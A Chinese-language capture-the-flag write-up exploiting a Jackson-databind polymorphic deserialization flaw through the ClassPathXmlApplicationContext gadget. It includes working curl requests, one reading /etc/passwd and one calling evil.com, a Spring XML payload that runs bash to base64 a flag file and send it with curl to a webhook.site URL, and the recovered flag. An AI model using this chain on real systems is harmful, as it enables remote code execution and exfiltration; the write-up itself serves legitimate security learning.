---
title: 'Jackson Polymorphic Deserialization RCE'
date: '2026-05-28'
modifiedTime: '2026-05-28'
intro: '- 靶场地址：`*.haobachang2.loveli.com.cn:8888`'
tags: ['ctf', 'writeup', 'cve', 'rce', '反序列化', 'java', 'python', '序列化']
cover: ''
---

# Jackson Polymorphic Deserialization RCE

## 靶场信息

- 靶场地址：`*.haobachang2.loveli.com.cn:8888`
- 漏洞类型：Jackson-databind Polymorphic Deserialization RCE
- 利用链：`ClassPathXmlApplicationContext` → Spring XML → `ProcessBuilder`

## 漏洞分析

### 端点探测

```bash
curl -X POST http://target:8888/exploit -H "Content-Type: application/json" -d '{}'
# 返回: com.b1ngz.sec.model.Target@xxxx
```

`/exploit` 端点接收 JSON，反序列化为 `com.b1ngz.sec.model.Target`。

### 参数探测

```bash
curl -X POST http://target:8888/exploit -d '{"param": "test"}'
# 返回: Target@xxxx (成功)

curl -X POST http://target:8888/exploit -d '{"param": ["java.lang.String", "test"]}'
# 返回: Target@xxxx (成功 - Jackson WRAPPER_ARRAY 多态类型)
```

错误信息中泄露了 `Target` 只有一个属性 `param`，类型为 `Object`，且 Jackson 使用 `WRAPPER_ARRAY` 格式的类型标识。

### 可用 Gadget 探测

| Gadget Class | 状态 |
|-------------|------|
| `com.sun.rowset.JdbcRowSetImpl` | ✅ 类存在，JNDI 被防火墙阻断 |
| `com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl` | ✅ 类存在，`outputProperties` 返回 null（JDK 模块限制） |
| `org.springframework.context.support.ClassPathXmlApplicationContext` | ✅ 单参构造可用，可发起 HTTP 请求 |
| `org.springframework.context.support.FileSystemXmlApplicationContext` | ✅ 可读本地文件（需有效 XML） |
| DBCP/C3P0/HikariCP 等 | ❌ 不在 classpath |

### 关键发现

```bash
# FileSystemXmlApplicationContext 可读取本地文件
curl -d '{"param":["org...FileSystemXmlApplicationContext","file:///etc/passwd"]}'
# 返回: SAXParseException - 文件存在但不是 XML

# ClassPathXmlApplicationContext 可发起 HTTP 请求
curl -d '{"param":["org...ClassPathXmlApplicationContext","http://evil.com/test.xml"]}'
# 返回: IOException HTTP 465 - 确认外网可达
```

## 利用过程

### 1. 准备 Spring XML Payload

```xml
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans
       http://www.springframework.org/schema/beans/spring-beans.xsd">
  <bean id="evil" class="java.lang.ProcessBuilder" init-method="start">
    <constructor-arg>
      <list>
        <value>/bin/bash</value>
        <value>-c</value>
        <value>F=$(cat /tmp/flag.txt|base64|tr -d '\n');curl -s 'https://webhook.site/xxx?f='$F</value>
      </list>
    </constructor-arg>
  </bean>
</beans>
```

### 2. VPS 托管 XML

- VPS 内网启动 `python3 -m http.server 8888`
- NAT 映射外网端口 → VPS:8888

### 3. 触发反序列化

```bash
curl -X POST http://target:8888/exploit \
  -H "Content-Type: application/json" \
  -d '{"param":["org.springframework.context.support.ClassPathXmlApplicationContext","http://VPS:PORT/evil.xml"]}'
# 返回: Target@xxxx (XML 加载 → ProcessBuilder.start() 执行)
```

### 4. 接收 Flag

Webhook.site 收到请求：
```
?f=ZmxhZ3syMGYyODRmODI2OTQ0N2JiYWU3OWFhYmNiZTM1MTEzOH0K
```

Base64 解码得 flag。

## Flag

```
flag{20f284f8269447bbae79aabcbe351138}
```

## 经验总结

1. **Jackson enableDefaultTyping + Object 类型字段** = 多态反序列化 RCE
2. **ClassPathXmlApplicationContext** 是 Spring 环境下最可靠的 Jackson gadget，不需要 JNDI / LDAP
3. `TemplatesImpl` 在 JDK 11+ 上受模块系统限制，`outputProperties` 可能无法触发
4. 错误回显能泄露大量信息（字段名、类路径、网络连通性）
